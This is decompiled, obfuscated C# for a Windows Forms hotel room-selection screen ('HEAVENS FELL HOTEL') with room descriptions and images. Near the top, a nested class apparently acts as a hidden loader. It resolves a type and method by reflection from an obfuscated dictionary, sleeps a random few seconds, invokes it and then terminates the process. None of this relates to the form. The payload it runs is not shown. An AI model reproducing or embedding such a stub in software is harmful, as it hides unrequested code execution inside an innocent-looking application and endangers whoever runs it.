using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Nn5;
using r4NX;
using z7W;

namespace r6MX;

[DesignerGenerated]
public class Pw8s : Form
{
	internal sealed class Kn3g
	{
		internal static void Jm24()
		{
			z1E.mDic.Add("I", typeof(z1E.x0S));
			Delegate value = Delegate.CreateDelegate(typeof(z1E.x0S), (Type)z1E.mDic[z1E.T], Conversions.ToString(z1E.mDic[z1E.mName]), ignoreCase: false, throwOnBindFailure: true);
			z1E.mDic.Add("ABSDF", value);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			if (z1E.mDic["ABSDF"] != null)
			{
				((z1E.x0S)(Delegate)z1E.mDic["ABSDF"])();
			}
			Environment.Exit(Environment.ExitCode);
		}
	}

	private IContainer components;

	private Button _Button2;

	private ComboBox _ComboBox1;

	private Label _Label2;

	private Label _Label1;

	private RichTextBox _RichTextBox1;

	private RichTextBox _RichTextBox2;

	private RichTextBox _RichTextBox4;

	private RichTextBox _RichTextBox5;

	private RichTextBox _RichTextBox7;

	private RichTextBox _RichTextBox8;

	private RichTextBox _RichTextBox9;

	private RichTextBox _RichTextBox10;

	private PictureBox _PictureBox3;

	private PictureBox _PictureBox4;

	private PictureBox _PictureBox6;

	private PictureBox _PictureBox8;

	private PictureBox _PictureBox9;

	internal PictureBox S;

	internal Label B;

	internal RichTextBox l;

	internal RichTextBox R;

	internal Label E;

	internal RichTextBox w;

	internal PictureBox k;

	internal PictureBox x;

	internal PictureBox I;

	internal PictureBox m;

	internal PictureBox v;

	public Pw8s()
	{
		g9TD();
	}

	protected override void Ae95(bool k4XZ)
	{
		try
		{
			if (k4XZ && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(k4XZ);
		}
	}

	private void g9TD()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_01f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fc: Expected O, but got Unknown
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0280: Expected O, but got Unknown
		//IL_0393: Unknown result type (might be due to invalid IL or missing references)
		//IL_039d: Expected O, but got Unknown
		//IL_0424: Unknown result type (might be due to invalid IL or missing references)
		//IL_042e: Expected O, but got Unknown
		//IL_0497: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a1: Expected O, but got Unknown
		//IL_051a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0524: Expected O, but got Unknown
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05bb: Expected O, but got Unknown
		//IL_0629: Unknown result type (might be due to invalid IL or missing references)
		//IL_0633: Expected O, but got Unknown
		//IL_06a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ae: Expected O, but got Unknown
		//IL_071f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0729: Expected O, but got Unknown
		//IL_07a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07aa: Expected O, but got Unknown
		//IL_0821: Unknown result type (might be due to invalid IL or missing references)
		//IL_082b: Expected O, but got Unknown
		//IL_08a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ac: Expected O, but got Unknown
		//IL_0923: Unknown result type (might be due to invalid IL or missing references)
		//IL_092d: Expected O, but got Unknown
		//IL_09a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ae: Expected O, but got Unknown
		//IL_0a25: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a2f: Expected O, but got Unknown
		//IL_0ac2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acc: Expected O, but got Unknown
		//IL_0b3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b47: Expected O, but got Unknown
		//IL_0bb6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc0: Expected O, but got Unknown
		//IL_0c37: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c41: Expected O, but got Unknown
		//IL_0cb8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc2: Expected O, but got Unknown
		//IL_0d39: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d43: Expected O, but got Unknown
		//IL_0dba: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dc4: Expected O, but got Unknown
		//IL_0e3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e45: Expected O, but got Unknown
		//IL_0ebc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ec6: Expected O, but got Unknown
		//IL_0f3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f47: Expected O, but got Unknown
		//IL_0fbe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fc8: Expected O, but got Unknown
		//IL_103f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1049: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Pw8s));
		Pk25(new Button());
		a9RH(new ComboBox());
		Ef1a(new Label());
		n3B1(new Label());
		Rw3k(new PictureBox());
		s1EC(new RichTextBox());
		k0L3(new Label());
		Fk0p(new RichTextBox());
		Yt06(new RichTextBox());
		Fy5r(new RichTextBox());
		e9CR(new RichTextBox());
		w7P5(new RichTextBox());
		Qm78(new RichTextBox());
		Yp51(new RichTextBox());
		Fc08(new RichTextBox());
		a9YD(new RichTextBox());
		q7F9(new Label());
		Yg4s(new RichTextBox());
		At81(new PictureBox());
		m0C8(new PictureBox());
		x4R6(new PictureBox());
		Xj41(new PictureBox());
		q0XA(new PictureBox());
		Xq1a(new PictureBox());
		Dz5k(new PictureBox());
		x8ZB(new PictureBox());
		d1DX(new PictureBox());
		a0T4(new PictureBox());
		((ISupportInitialize)i5Z9()).BeginInit();
		((ISupportInitialize)Gf9p()).BeginInit();
		((ISupportInitialize)Sp8g()).BeginInit();
		((ISupportInitialize)p7RD()).BeginInit();
		((ISupportInitialize)n2KW()).BeginInit();
		((ISupportInitialize)p8N9()).BeginInit();
		((ISupportInitialize)e5YH()).BeginInit();
		((ISupportInitialize)g7WE()).BeginInit();
		((ISupportInitialize)Bi3t()).BeginInit();
		((ISupportInitialize)f7A5()).BeginInit();
		((ISupportInitialize)c0W9()).BeginInit();
		((Control)this).SuspendLayout();
		((ButtonBase)Wd47()).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(0, 0, 192));
		((Control)Wd47()).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Wd47()).set_Location(new Point(18, 341));
		((Control)Wd47()).set_Name("Button2");
		((Control)Wd47()).set_Size(new Size(129, 40));
		((Control)Wd47()).set_TabIndex(28);
		((ButtonBase)Wd47()).set_Text("Back to Menu");
		((ButtonBase)Wd47()).set_UseVisualStyleBackColor(true);
		((Control)Gt8y()).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)Gt8y()).set_FormattingEnabled(true);
		Gt8y().get_Items().AddRange(new object[12]
		{
			"PinakaDATO Suite Room", "Medyo DATO Suite Room", "DATO-DATOAN Suite Room", "Pinaka-MAYKAYA Suite Room", "Medyo MAYKAYA Room", "KAYA-KAYAHA Room", "POBRE Room", "Mas-POBRE Room", "Pinaka-POBRE Room", "Pinaka-AFFORDABLE Suite Room",
			"", ""
		});
		((Control)Gt8y()).set_Location(new Point(233, 301));
		((Control)Gt8y()).set_Name("ComboBox1");
		((Control)Gt8y()).set_Size(new Size(330, 24));
		((Control)Gt8y()).set_TabIndex(25);
		Gt8y().set_Text("Select your choices here...");
		Mc1k().set_AutoSize(true);
		((Control)Mc1k()).set_BackColor(Color.Transparent);
		((Control)Mc1k()).set_Font(new Font("Microsoft Sans Serif", 20f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Mc1k()).set_Location(new Point(12, 11));
		((Control)Mc1k()).set_Name("Label2");
		((Control)Mc1k()).set_Size(new Size(332, 31));
		((Control)Mc1k()).set_TabIndex(24);
		Mc1k().set_Text("HEAVENS FELL HOTEL");
		w0T2().set_AutoSize(true);
		((Control)w0T2()).set_BackColor(Color.Transparent);
		((Control)w0T2()).set_Font(new Font("Microsoft Sans Serif", 13f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)w0T2()).set_Location(new Point(12, 53));
		((Control)w0T2()).set_Name("Label1");
		((Control)w0T2()).set_Size(new Size(227, 22));
		((Control)w0T2()).set_TabIndex(23);
		w0T2().set_Text("ALL TYPES OF ROOMS");
		((Control)i5Z9()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox1.BackgroundImage"));
		((Control)i5Z9()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)i5Z9()).set_Location(new Point(233, 87));
		((Control)i5Z9()).set_Name("PictureBox1");
		((Control)i5Z9()).set_Size(new Size(330, 208));
		i5Z9().set_TabIndex(29);
		i5Z9().set_TabStop(false);
		Zc13().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Zc13()).set_Location(new Point(589, 119));
		((Control)Zc13()).set_Name("RichTextBox1");
		((Control)Zc13()).set_Size(new Size(163, 159));
		((Control)Zc13()).set_TabIndex(31);
		Zc13().set_Text("PinakaDATO Suite Room\n- Is a suite room for the rich, grand, and affluent persons\n- If you are rich you should live here silkpants.\n- To avail one of this rooms\nyou must have 1M worth of \npocketmoney.");
		s9E0().set_AutoSize(true);
		((Control)s9E0()).set_BackColor(Color.Transparent);
		((Control)s9E0()).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)s9E0()).set_Location(new Point(586, 87));
		((Control)s9E0()).set_Name("Label3");
		((Control)s9E0()).set_Size(new Size(141, 17));
		((Control)s9E0()).set_TabIndex(32);
		s9E0().set_Text("Room Description:");
		Kg7i().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Kg7i()).set_Location(new Point(589, 119));
		((Control)Kg7i()).set_Name("RichTextBox2");
		((Control)Kg7i()).set_Size(new Size(163, 159));
		((Control)Kg7i()).set_TabIndex(33);
		Kg7i().set_Text("MedyoDATO Suite Room\n- Is a suite room for the rich, and grand persons\n- If you are rich you should live here silkpants.\n- To avail one of this rooms\nyou must have 500k worth of \npocketmoney.");
		Pa03().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Pa03()).set_Location(new Point(589, 119));
		((Control)Pa03()).set_Name("RichTextBox3");
		((Control)Pa03()).set_Size(new Size(163, 159));
		((Control)Pa03()).set_TabIndex(34);
		Pa03().set_Text("DATO-DATOAN Suite Room\n- Is a suite room for rich persons.\n- If you are rich you should live here silkpants.\n- To avail one of this rooms\nyou must have 500k worth of \npocketmoney.");
		a0WG().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)a0WG()).set_Location(new Point(589, 119));
		((Control)a0WG()).set_Name("RichTextBox4");
		((Control)a0WG()).set_Size(new Size(163, 159));
		((Control)a0WG()).set_TabIndex(35);
		a0WG().set_Text(componentResourceManager.GetString("RichTextBox4.Text"));
		Sq59().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Sq59()).set_Location(new Point(589, 119));
		((Control)Sq59()).set_Name("RichTextBox5");
		((Control)Sq59()).set_Size(new Size(163, 159));
		((Control)Sq59()).set_TabIndex(36);
		Sq59().set_Text(componentResourceManager.GetString("RichTextBox5.Text"));
		q0S7().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)q0S7()).set_Location(new Point(589, 119));
		((Control)q0S7()).set_Name("RichTextBox6");
		((Control)q0S7()).set_Size(new Size(163, 159));
		((Control)q0S7()).set_TabIndex(37);
		q0S7().set_Text(componentResourceManager.GetString("RichTextBox6.Text"));
		i4C9().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)i4C9()).set_Location(new Point(589, 119));
		((Control)i4C9()).set_Name("RichTextBox7");
		((Control)i4C9()).set_Size(new Size(163, 159));
		((Control)i4C9()).set_TabIndex(38);
		i4C9().set_Text(componentResourceManager.GetString("RichTextBox7.Text"));
		m9B7().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)m9B7()).set_Location(new Point(589, 119));
		((Control)m9B7()).set_Name("RichTextBox8");
		((Control)m9B7()).set_Size(new Size(163, 159));
		((Control)m9B7()).set_TabIndex(39);
		m9B7().set_Text(componentResourceManager.GetString("RichTextBox8.Text"));
		i7QP().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)i7QP()).set_Location(new Point(589, 119));
		((Control)i7QP()).set_Name("RichTextBox9");
		((Control)i7QP()).set_Size(new Size(163, 205));
		((Control)i7QP()).set_TabIndex(40);
		i7QP().set_Text(componentResourceManager.GetString("RichTextBox9.Text"));
		Wo6n().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Wo6n()).set_Location(new Point(589, 120));
		((Control)Wo6n()).set_Name("RichTextBox10");
		((Control)Wo6n()).set_Size(new Size(163, 205));
		((Control)Wo6n()).set_TabIndex(41);
		Wo6n().set_Text(componentResourceManager.GetString("RichTextBox10.Text"));
		t1F0().set_AutoSize(true);
		((Control)t1F0()).set_BackColor(Color.Transparent);
		((Control)t1F0()).set_Font(new Font("Microsoft Sans Serif", 8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)t1F0()).set_Location(new Point(512, 341));
		((Control)t1F0()).set_Name("Label4");
		((Control)t1F0()).set_Size(new Size(240, 13));
		((Control)t1F0()).set_TabIndex(42);
		t1F0().set_Text("All room types have only ten rooms each.");
		p3XN().set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)p3XN()).set_Location(new Point(589, 120));
		((Control)p3XN()).set_Name("RichTextBox11");
		((Control)p3XN()).set_Size(new Size(163, 205));
		((Control)p3XN()).set_TabIndex(43);
		p3XN().set_Text("");
		((Control)Gf9p()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox2.BackgroundImage"));
		((Control)Gf9p()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Gf9p()).set_Location(new Point(233, 87));
		((Control)Gf9p()).set_Name("PictureBox2");
		((Control)Gf9p()).set_Size(new Size(330, 208));
		Gf9p().set_TabIndex(44);
		Gf9p().set_TabStop(false);
		((Control)Sp8g()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox3.BackgroundImage"));
		((Control)Sp8g()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Sp8g()).set_Location(new Point(233, 87));
		((Control)Sp8g()).set_Name("PictureBox3");
		((Control)Sp8g()).set_Size(new Size(330, 208));
		Sp8g().set_TabIndex(45);
		Sp8g().set_TabStop(false);
		((Control)p7RD()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox4.BackgroundImage"));
		((Control)p7RD()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)p7RD()).set_Location(new Point(233, 87));
		((Control)p7RD()).set_Name("PictureBox4");
		((Control)p7RD()).set_Size(new Size(330, 208));
		p7RD().set_TabIndex(46);
		p7RD().set_TabStop(false);
		((Control)n2KW()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox5.BackgroundImage"));
		((Control)n2KW()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)n2KW()).set_Location(new Point(233, 87));
		((Control)n2KW()).set_Name("PictureBox5");
		((Control)n2KW()).set_Size(new Size(330, 208));
		n2KW().set_TabIndex(47);
		n2KW().set_TabStop(false);
		((Control)p8N9()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox6.BackgroundImage"));
		((Control)p8N9()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)p8N9()).set_Location(new Point(233, 87));
		((Control)p8N9()).set_Name("PictureBox6");
		((Control)p8N9()).set_Size(new Size(330, 208));
		p8N9().set_TabIndex(48);
		p8N9().set_TabStop(false);
		((Control)e5YH()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox7.BackgroundImage"));
		((Control)e5YH()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)e5YH()).set_Location(new Point(233, 87));
		((Control)e5YH()).set_Name("PictureBox7");
		((Control)e5YH()).set_Size(new Size(330, 208));
		e5YH().set_TabIndex(49);
		e5YH().set_TabStop(false);
		((Control)g7WE()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox8.BackgroundImage"));
		((Control)g7WE()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)g7WE()).set_Location(new Point(233, 87));
		((Control)g7WE()).set_Name("PictureBox8");
		((Control)g7WE()).set_Size(new Size(330, 208));
		g7WE().set_TabIndex(50);
		g7WE().set_TabStop(false);
		((Control)Bi3t()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox9.BackgroundImage"));
		((Control)Bi3t()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Bi3t()).set_Location(new Point(233, 87));
		((Control)Bi3t()).set_Name("PictureBox9");
		((Control)Bi3t()).set_Size(new Size(330, 208));
		Bi3t().set_TabIndex(51);
		Bi3t().set_TabStop(false);
		((Control)f7A5()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox10.BackgroundImage"));
		((Control)f7A5()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)f7A5()).set_Location(new Point(233, 87));
		((Control)f7A5()).set_Name("PictureBox10");
		((Control)f7A5()).set_Size(new Size(330, 208));
		f7A5().set_TabIndex(52);
		f7A5().set_TabStop(false);
		((Control)c0W9()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox11.BackgroundImage"));
		((Control)c0W9()).set_BackgroundImageLayout((ImageLayout)3);
		c0W9().set_BorderStyle((BorderStyle)2);
		((Control)c0W9()).set_Location(new Point(233, 87));
		((Control)c0W9()).set_Name("PictureBox11");
		((Control)c0W9()).set_Size(new Size(330, 208));
		c0W9().set_TabIndex(53);
		c0W9().set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(775, 392));
		((Control)this).get_Controls().Add((Control)(object)c0W9());
		((Control)this).get_Controls().Add((Control)(object)f7A5());
		((Control)this).get_Controls().Add((Control)(object)Bi3t());
		((Control)this).get_Controls().Add((Control)(object)g7WE());
		((Control)this).get_Controls().Add((Control)(object)e5YH());
		((Control)this).get_Controls().Add((Control)(object)p8N9());
		((Control)this).get_Controls().Add((Control)(object)n2KW());
		((Control)this).get_Controls().Add((Control)(object)p7RD());
		((Control)this).get_Controls().Add((Control)(object)Sp8g());
		((Control)this).get_Controls().Add((Control)(object)Gf9p());
		((Control)this).get_Controls().Add((Control)(object)p3XN());
		((Control)this).get_Controls().Add((Control)(object)t1F0());
		((Control)this).get_Controls().Add((Control)(object)Wo6n());
		((Control)this).get_Controls().Add((Control)(object)i7QP());
		((Control)this).get_Controls().Add((Control)(object)m9B7());
		((Control)this).get_Controls().Add((Control)(object)i4C9());
		((Control)this).get_Controls().Add((Control)(object)q0S7());
		((Control)this).get_Controls().Add((Control)(object)Sq59());
		((Control)this).get_Controls().Add((Control)(object)a0WG());
		((Control)this).get_Controls().Add((Control)(object)Pa03());
		((Control)this).get_Controls().Add((Control)(object)Kg7i());
		((Control)this).get_Controls().Add((Control)(object)s9E0());
		((Control)this).get_Controls().Add((Control)(object)Zc13());
		((Control)this).get_Controls().Add((Control)(object)i5Z9());
		((Control)this).get_Controls().Add((Control)(object)Wd47());
		((Control)this).get_Controls().Add((Control)(object)Gt8y());
		((Control)this).get_Controls().Add((Control)(object)Mc1k());
		((Control)this).get_Controls().Add((Control)(object)w0T2());
		((Control)this).set_Name("Form7");
		((Form)this).set_Text("ROOMS");
		((ISupportInitialize)i5Z9()).EndInit();
		((ISupportInitialize)Gf9p()).EndInit();
		((ISupportInitialize)Sp8g()).EndInit();
		((ISupportInitialize)p7RD()).EndInit();
		((ISupportInitialize)n2KW()).EndInit();
		((ISupportInitialize)p8N9()).EndInit();
		((ISupportInitialize)e5YH()).EndInit();
		((ISupportInitialize)g7WE()).EndInit();
		((ISupportInitialize)Bi3t()).EndInit();
		((ISupportInitialize)f7A5()).EndInit();
		((ISupportInitialize)c0W9()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button Wd47()
	{
		return _Button2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pk25(Button Kp84)
	{
		EventHandler eventHandler = x5AX;
		Button button = _Button2;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button2 = Kp84;
		button = _Button2;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ComboBox Gt8y()
	{
		return _ComboBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a9RH(ComboBox Na41)
	{
		EventHandler eventHandler = Sx8t;
		ComboBox comboBox = _ComboBox1;
		if (comboBox != null)
		{
			comboBox.remove_SelectedIndexChanged(eventHandler);
		}
		_ComboBox1 = Na41;
		comboBox = _ComboBox1;
		if (comboBox != null)
		{
			comboBox.add_SelectedIndexChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Mc1k()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ef1a(Label s2FX)
	{
		_Label2 = s2FX;
	}

	[SpecialName]
	internal virtual Label w0T2()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void n3B1(Label o4H0)
	{
		_Label1 = o4H0;
	}

	[SpecialName]
	internal virtual PictureBox i5Z9()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Rw3k(PictureBox a4S0)
	{
		PictureBox val = (S = a4S0);
	}

	[SpecialName]
	internal virtual RichTextBox Zc13()
	{
		return _RichTextBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s1EC(RichTextBox k2F9)
	{
		_RichTextBox1 = k2F9;
	}

	[SpecialName]
	internal virtual Label s9E0()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k0L3(Label f4E1)
	{
		Label val = (B = f4E1);
	}

	[SpecialName]
	internal virtual RichTextBox Kg7i()
	{
		return _RichTextBox2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fk0p(RichTextBox t5JT)
	{
		_RichTextBox2 = t5JT;
	}

	[SpecialName]
	internal virtual RichTextBox Pa03()
	{
		return l;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yt06(RichTextBox Fx46)
	{
		RichTextBox val = (l = Fx46);
	}

	[SpecialName]
	internal virtual RichTextBox a0WG()
	{
		return _RichTextBox4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fy5r(RichTextBox i1H2)
	{
		_RichTextBox4 = i1H2;
	}

	[SpecialName]
	internal virtual RichTextBox Sq59()
	{
		return _RichTextBox5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e9CR(RichTextBox Lt29)
	{
		_RichTextBox5 = Lt29;
	}

	[SpecialName]
	internal virtual RichTextBox q0S7()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void w7P5(RichTextBox k4XE)
	{
		RichTextBox val = (R = k4XE);
	}

	[SpecialName]
	internal virtual RichTextBox i4C9()
	{
		return _RichTextBox7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qm78(RichTextBox Cj9d)
	{
		_RichTextBox7 = Cj9d;
	}

	[SpecialName]
	internal virtual RichTextBox m9B7()
	{
		return _RichTextBox8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yp51(RichTextBox a4EQ)
	{
		_RichTextBox8 = a4EQ;
	}

	[SpecialName]
	internal virtual RichTextBox i7QP()
	{
		return _RichTextBox9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fc08(RichTextBox q1BX)
	{
		_RichTextBox9 = q1BX;
	}

	[SpecialName]
	internal virtual RichTextBox Wo6n()
	{
		return _RichTextBox10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a9YD(RichTextBox Sn4o)
	{
		_RichTextBox10 = Sn4o;
	}

	[SpecialName]
	internal virtual Label t1F0()
	{
		return E;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q7F9(Label c4W5)
	{
		Label val = (E = c4W5);
	}

	[SpecialName]
	internal virtual RichTextBox p3XN()
	{
		return w;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yg4s(RichTextBox z5EQ)
	{
		RichTextBox val = (w = z5EQ);
	}

	[SpecialName]
	internal virtual PictureBox Gf9p()
	{
		return k;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void At81(PictureBox d4N0)
	{
		PictureBox val = (k = d4N0);
	}

	[SpecialName]
	internal virtual PictureBox Sp8g()
	{
		return _PictureBox3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m0C8(PictureBox Bb6s)
	{
		_PictureBox3 = Bb6s;
	}

	[SpecialName]
	internal virtual PictureBox p7RD()
	{
		return _PictureBox4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x4R6(PictureBox Ws3f)
	{
		_PictureBox4 = Ws3f;
	}

	[SpecialName]
	internal virtual PictureBox n2KW()
	{
		return x;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xj41(PictureBox e3FS)
	{
		PictureBox val = (x = e3FS);
	}

	[SpecialName]
	internal virtual PictureBox p8N9()
	{
		return _PictureBox6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q0XA(PictureBox a5EH)
	{
		_PictureBox6 = a5EH;
	}

	[SpecialName]
	internal virtual PictureBox e5YH()
	{
		return I;
	}

